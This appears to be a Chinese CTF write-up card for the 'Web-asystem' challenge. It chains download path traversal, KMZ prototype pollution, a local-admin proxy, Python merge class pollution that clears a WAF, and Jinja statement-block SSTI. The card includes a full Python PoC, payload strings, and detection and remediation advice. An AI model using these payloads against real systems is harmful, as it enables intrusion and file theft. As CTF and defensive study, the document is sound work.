---
id: ctf-web-flask-node-file-read-prototype-pollution-ssti-chain
title: Flask+Node 多组件链：下载穿越读源码 → KMZ 原型污染激活本地管理接口 → merge 清 WAF → Jinja 语句块 SSTI
type: scenario
domain: ctf
path: ctf/web
technique: flask-node-multi-component-prototype-pollution-ssti-chain
aliases:
- DCIC Web-asystem
- Flask Node 多组件链
- KMZ 原型污染 + SSTI
- merge 清 WAF
- 本地管理接口 SSRF
- Jinja 语句块 SSTI
tags:
- ctf
- web
- flask
- nodejs
- prototype-pollution
- ssti
- path-traversal
- file-read
- exploit-chain
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-06'
updated: '2026-11-06'
verification:
  verified_by: verifier-V126
  verified_at: '2026-11-06T04:17:51+08:00'
  notes: 已对照原文 Web-asystem 段核对：/download 拼接穿越读 app.py/server/app.js、KMZ xmlToJson 标签名 __proto__ 注入 FIX_SECRET、Node /admin 仅本地 IP 且 fix=true 分支、Flask /api/fix-secret 代理、/register merge(__class__.__init__.__globals__) 清 WAF（Unicode 转义绕过）、/protected 仅过滤 {{}} 而 {%if%} 可用、SSTI 写 out.txt 再下载，均与原文源码/exp 一致。PoC 未本机复跑；原文未标注组件版本。
---

## 一句话结论

先利用 Flask `/download` 的路径拼接穿越读取前后端源码；再用 Node KMZ 的 XML-to-JSON 原型污染设置 `FIX_SECRET`，通过 Flask `/api/fix-secret` 间接调用仅本地可访问的 `/admin?fix=true` 写入管理员密钥；随后用 Flask `/register` 的递归 merge 类污染（Unicode 转义绕过 WAF）清空 WAF；最后在 `/protected` 用 `{%if%}` 语句块 SSTI 把 `/flag` 写入可下载目录并取回。

## 原理

- **第一步：下载接口路径穿越**：`/download?filename=` 直接拼到 `/datas/upload_files/` 后 `send_file`，WAF 只拦 `flag`/`config`；用 `../../proc/self/cwd/app.py` 读 Flask 源码，用 `../../server/app.js` 读 Node 源码，拿到后续所有接口与逻辑。
- **第二步：Node KMZ 原型污染**：`/api/upload` 接受 `.kmz`（zip 内 `doc.kml`），`parseKMZ.toKML` 后 `xmlToJson` 把 XML 标签名当对象键；`<__proto__><FIX_SECRET>known-secret</FIX_SECRET></__proto__>` 写入 `Object.prototype`。Node `/admin` 只允许本地 IP，且 `fix === 'true' && FIX_SECRET !== undefined` 时才写 `CONFIG_PATH` 并返回 `admin_secret`；污染后该分支可达。
- **第三步：Flask 代理激活本地接口**：Flask `/api/fix-secret` 从服务端请求 Node `/admin?fix=true`（本地回环），把 `admin_secret` 返回给外部；这相当于一个受限 SSRF，绕过了 Node 的 `req.ip` 本地检查。
- **第四步：Flask merge 类污染清 WAF**：`/register` 读取 JSON 后 `merge(data, user)`，递归逻辑对 `hasattr` 的属性继续 `getattr`/`setattr`；提交 `__class__.__init__.__globals__` 路径可进入模块全局命名空间，把 `WAF` 置空。WAF 只对原始字符串做 `lower().replace('"','')` 关键字匹配，JSON 里的 `_` 等 Unicode 转义不会命中 `__class__`/`__globals__` 字面量，但 `json.loads` 会还原。
- **第五步：Jinja 语句块 SSTI**：`/protected` 先要求 `password == admin_secret`，再检查 `{{`/`}}` 与 WAF 关键字；但 `render_template_string` 直接拼接 `current_user`，且没有 ban `{%`。用 `{%if EXPRESSION%}{%endif%}` 语句块执行表达式，借 `cycler.__init__.__globals__.__builtins__.open` 读 `/flag` 并写入 `/datas/upload_files/out.txt`，最后用 `/download?filename=out.txt` 取回。
- **为什么能串起来**：每个组件单独看都只是“路径穿越/原型污染/SSTI”，但源码泄露让攻击者知道内部接口与变量名；原型污染把“未定义变量”变成“可控配置”；merge 污染把 WAF 清空；最后 SSTI 的 `{{}}` 过滤被语句块绕过。

## 触发条件

- Flask 网关存在下载接口路径拼接穿越，且 WAF 只做弱关键字过滤。
- Node 文件处理组件接受 KMZ/XML，XML-to-JSON 解析器不过滤 `__proto__`，且存在依赖未声明全局变量的本地管理分支。
- Flask 存在 `/api/fix-secret` 之类的本地代理/SSRF，能把外部请求转成对 Node 的本地请求。
- Flask `/register` 使用递归 merge 且未过滤 dunder 属性；`/protected` 使用 `render_template_string` 拼接用户输入，且只过滤 `{{`/`}}`。
- 攻击者能读到源码（第一步）或通过其他方式获知内部 URL/变量名。

## 利用步骤

1. 读源码：`/download?filename=../../proc/self/cwd/app.py`、`../../server/app.js`，提取路由、WAF 列表、`NODE_BACKEND_URL`、`FIX_SECRET`、`merge` 逻辑。
2. 用 merge 污染把 `NODE_BACKEND_URL` 指到 `http://127.0.0.1:3000`（若原值不可用），确保后续代理命中本地 Node。
3. 上传 KMZ：`<__proto__><FIX_SECRET>known-secret</FIX_SECRET></__proto__>`，触发 XML-to-JSON 原型污染。
4. 请求 `/api/fix-secret`，让 Flask 以本地身份调用 Node `/admin?fix=true`，拿到 `admin_secret`。
5. 用 Unicode 转义 JSON 打 `/register`，经 `__class__.__init__.__globals__` 把 `WAF` 置空（可重复多次确保生效）。
6. 请求 `/protected?user={%if ...%}{%endif%}&password=<admin_secret>`，把 `/flag` 写入 `/datas/upload_files/out.txt`。
7. 请求 `/download?filename=out.txt` 取回 flag。

## PoC

```python
import io
import json
import zipfile
import requests

BASE = "http://target"
s = requests.Session()

def spray_register(payload: str, times: int = 10):
    for _ in range(times):
        r = s.post(f"{BASE}/register", data=payload,
                   headers={"Content-Type": "application/json"}, timeout=10)
        print("[register]", r.status_code, r.text[:120])

def build_kmz(xml_text: str) -> bytes:
    mem = io.BytesIO()
    with zipfile.ZipFile(mem, "w", zipfile.ZIP_DEFLATED) as zf:
        zf.writestr("doc.kml", xml_text)
    mem.seek(0)
    return mem.getvalue()

# 1) 把 NODE_BACKEND_URL 指到本地 Node（Unicode 转义绕过 WAF）
restore = ('{"\\u005f\\u005fclass\\u005f\\u005f":'
           '{"\\u005f\\u005f\\u0069n\\u0069t\\u005f\\u005f":'
           '{"\\u005f\\u005fgloba\\u006cs\\u005f\\u005f":'
           '{"NODE\\u005fBACKEND\\u005fU\\u0052L":"http:\\u002f\\u002f127.0.0.1:3000"}}}}')
spray_register(restore)

# 2) KMZ 原型污染 FIX_SECRET
xml = "<__proto__><FIX_SECRET>known-secret</FIX_SECRET></__proto__>"
r = s.post(f"{BASE}/api/upload",
           files={"file": ("pollute.kmz", build_kmz(xml),
                           "application/vnd.google-earth.kmz")}, timeout=30)
print("[upload]", r.status_code, r.text)

# 3) 通过 Flask 代理激活 Node 本地 /admin?fix=true
r = s.get(f"{BASE}/api/fix-secret", timeout=20)
secret = r.json()["data"]["admin_secret"]
print("[secret]", secret)

# 4) 清空 Flask WAF
clear = ('{"\\u005f\\u005fclass\\u005f\\u005f":'
         '{"\\u005f\\u005f\\u0069n\\u0069t\\u005f\\u005f":'
         '{"\\u005f\\u005fgloba\\u006cs\\u005f\\u005f":{"WAF":""}}}}')
spray_register(clear, times=20)

# 5) 语句块 SSTI 把 /flag 写到可下载目录
payload = ("{%if cycler.__init__.__globals__.__builtins__.open("
           "'/datas/upload_files/out.txt','w').write("
           "cycler.__init__.__globals__.__builtins__.open('/flag').read())%}{%endif%}")
r = s.get(f"{BASE}/protected", params={"user": payload, "password": secret}, timeout=20)
print("[protected]", r.status_code, r.text)

# 6) 下载 flag
r = s.get(f"{BASE}/download", params={"filename": "out.txt"}, timeout=20)
print("[flag]", r.text.strip())
```

## 变体与关联

- **组件替换**：Node 侧 XML 解析器可换 `xml2js`/`fast-xml-parser`；Flask 侧 merge 可换其他递归合并函数；SSTI 可用 `{% print(...) %}`/`{% set %}` 等语句块。
- **代理变体**：本地管理接口可能通过 SSRF、URL 抓取、webhook、内网请求等触发；关键是让请求源 IP 变成 `127.0.0.1`。
- **WAF 绕过变体**：Unicode 转义、JSON 转义、大小写、字符串拼接、参数拆分；按 WAF 的检查位置选择。
- **关联卡片**：[[web-nodejs-prototype-pollution-xml-to-json-kmz]]（KMZ 原型污染）、[[web-generic-file-inclusion-flask-sendfile-download-traversal]]（下载穿越）、[[web-python-recursive-merge-class-pollution-globals-rce]]（Python merge 类污染）、[[web-python-ssti-jinja2-waf-bypass-hex-attr-args]]（SSTI 关键字绕过）。
- **边界**：任一组件修复（路径校验、解析器过滤危险键、merge 过滤 dunder、SSTI 沙箱/禁止语句块）都会断链；源码不可读时需通过其他方式获知内部变量名。

## 检测与防御

- **检测特征**：下载参数含 `..`/`/proc/self`；上传 KMZ 中出现 `__proto__`；`/register` 收到含 `_` 的 JSON；`/protected` 出现 `{%if`/`cycler`/`__globals__`；同一会话先读源码再访问内部接口。
- **修复**：
  - 下载接口用 `realpath` + `commonpath` 校验，拒绝 `..`/绝对路径；
  - XML-to-JSON 解析后递归剥离 `__proto__`/`constructor`/`prototype`，使用 `Object.create(null)`；
  - 本地管理接口不要仅依赖 `req.ip`，加内部鉴权/随机 token；
  - merge 拒绝 dunder 属性，或改用显式字段白名单；
  - 禁止 `render_template_string` 拼接用户输入，使用沙箱环境并过滤 `{%`。
- **最小权限**：Node/Flask 进程隔离，限制可读文件与内网访问；WAF 对解码后的内容做二次匹配。
